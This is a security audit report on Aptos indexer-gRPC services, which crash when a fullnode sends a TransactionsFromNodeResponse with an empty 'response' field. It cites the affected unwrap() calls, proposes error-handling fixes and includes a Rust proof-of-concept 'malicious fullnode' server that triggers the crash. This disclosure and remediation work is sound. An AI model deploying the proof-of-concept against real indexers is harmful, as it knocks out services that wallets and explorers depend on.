# Audit Report

## Title
Indexer-gRPC Services Crash on Malformed TransactionsFromNodeResponse Messages

## Summary
Multiple indexer-gRPC components unconditionally unwrap the optional `response` field of `TransactionsFromNodeResponse` protobuf messages without checking if it exists. A malicious or buggy fullnode can send messages with an empty `response` field, causing immediate panic and service crash across critical indexing infrastructure.

## Finding Description

The protobuf definition for `TransactionsFromNodeResponse` defines the `response` field as a `oneof`, which is optional in protobuf3: [1](#0-0) 

In Rust, this translates to `Option<Response>`, as confirmed by the generated code: [2](#0-1) 

However, three critical indexer components call `.unwrap()` on this optional field without validation:

**1. File Store Backfiller:** [3](#0-2) 

**2. Cache Worker:** [4](#0-3) 

**3. V2 File Store Backfiller:** [5](#0-4) 

While the legitimate fullnode implementation always populates the `response` field correctly: [6](#0-5) 

A malicious or buggy fullnode is not obligated to follow this pattern. Since protobuf allows the `oneof` field to be unset, an attacker can send `TransactionsFromNodeResponse { response: None, chain_id: x }` messages, causing the indexer services to panic immediately on `.unwrap()`.

**Attack Path:**
1. Attacker runs a malicious fullnode or compromises an existing fullnode connection
2. Indexer connects to the malicious fullnode via gRPC
3. Malicious fullnode sends `TransactionsFromNodeResponse` with `response: None`
4. Indexer calls `.unwrap()` on the None value
5. Rust panic occurs, crashing the indexer service
6. Service requires manual restart
7. Attack can be repeated indefinitely

## Impact Explanation

This vulnerability qualifies as **HIGH Severity** per Aptos bug bounty criteria: "API crashes."

The indexer-gRPC infrastructure is critical for the Aptos ecosystem, providing transaction data to wallets, explorers, analytics platforms, and other downstream applications. A successful attack results in:

- **Immediate Denial of Service**: All affected indexer services crash instantly
- **Data Availability Loss**: Transaction indexing stops, affecting all dependent applications
- **Persistent Impact**: Attack can be repeated after each service restart
- **Wide Blast Radius**: Three separate critical services are vulnerable
- **Zero Authentication Required**: Any entity capable of running a fullnode can execute the attack

The crash affects the entire indexing pipeline, not just individual transactions, making this a significant availability violation.

## Likelihood Explanation

**Likelihood: HIGH**

The attack requires only:
1. Ability to act as a fullnode peer or compromise a fullnode connection
2. Basic knowledge of protobuf message construction
3. A single malformed message

No special permissions, validator access, or complex exploit chain is required. The vulnerability can be triggered trivially:

```rust
// Malicious fullnode sends:
TransactionsFromNodeResponse {
    response: None,  // Empty oneof field
    chain_id: 1,
}
```

Given the simplicity and the fact that fullnode endpoints are often exposed for indexer connectivity, this attack is highly likely to be discovered and exploited.

## Recommendation

Replace all `.unwrap()` calls with proper error handling. Use pattern matching or `ok_or_else()` to gracefully handle missing fields:

```rust
// Option 1: Using ok_or_else
let resp = response.response.ok_or_else(|| {
    anyhow::anyhow!("Received TransactionsFromNodeResponse without response field")
})?;

// Option 2: Using match with logging
let resp = match response.response {
    Some(r) => r,
    None => {
        tracing::error!(
            chain_id = response.chain_id,
            "Received malformed response from fullnode without response field"
        );
        anyhow::bail!("Invalid response from fullnode: missing response field");
    }
};
```

Apply this fix to all three affected files:
- `ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs:276`
- `ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs:189`
- `ecosystem/indexer-grpc/indexer-grpc-v2-file-store-backfiller/src/processor.rs:177`

Additionally, consider implementing connection-level validation to disconnect from fullnodes that send malformed messages, preventing repeat attacks.

## Proof of Concept

```rust
// malicious_fullnode_poc.rs
// Demonstrates sending a malformed response that crashes the indexer

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    GetTransactionsFromNodeRequest,
    TransactionsFromNodeResponse,
};
use tonic::{Request, Response, Status};

pub struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = 
        futures::stream::Once<futures::future::Ready<Result<TransactionsFromNodeResponse, Status>>>;

    async fn get_transactions_from_node(
        &self,
        _request: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Send malformed response with no response field
        let malformed_response = TransactionsFromNodeResponse {
            response: None,  // This will crash the indexer on unwrap()
            chain_id: 1,
        };
        
        let stream = futures::stream::once(
            futures::future::ready(Ok(malformed_response))
        );
        
        Ok(Response::new(stream))
    }

    async fn ping(
        &self,
        _request: Request<aptos_protos::internal::fullnode::v1::PingFullnodeRequest>,
    ) -> Result<Response<aptos_protos::internal::fullnode::v1::PingFullnodeResponse>, Status> {
        unimplemented!()
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let addr = "[::1]:50051".parse()?;
    let malicious_service = MaliciousFullnode;

    println!("Starting malicious fullnode on {}", addr);
    println!("Any indexer connecting to this node will crash on the first response");
    
    tonic::transport::Server::builder()
        .add_service(FullnodeDataServer::new(malicious_service))
        .serve(addr)
        .await?;

    Ok(())
}
```

**Expected Result:** When an indexer-grpc service connects to this malicious fullnode, it will immediately panic with:
```
thread 'tokio-runtime-worker' panicked at 'called `Option::unwrap()` on a `None` value'
```

## Notes

This vulnerability demonstrates a critical pattern of unsafe protobuf field access across the indexer infrastructure. The legitimate fullnode implementation correctly populates all fields, but the defensive assumption that all peers will behave correctly is violated. The protobuf wire format explicitly allows optional fields to be absent, making this a realistic attack vector against any service that doesn't validate optional fields before unwrapping them.

### Citations

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L47-54)
```text
message TransactionsFromNodeResponse {
  oneof response {
    StreamStatus status = 1;
    TransactionsOutput data = 2;
  }
  // Making sure that all the responses include a chain id
  uint32 chain_id = 3;
}
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L79-85)
```rust
pub struct TransactionsFromNodeResponse {
    /// Making sure that all the responses include a chain id
    #[prost(uint32, tag="3")]
    pub chain_id: u32,
    #[prost(oneof="transactions_from_node_response::Response", tags="1, 2")]
    pub response: ::core::option::Option<transactions_from_node_response::Response>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L276-276)
```rust
            let resp = response.response.unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L189-189)
```rust
    match response.response.unwrap() {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-v2-file-store-backfiller/src/processor.rs (L177-177)
```rust
                                    match r.response.unwrap() {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L187-194)
```rust
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
```
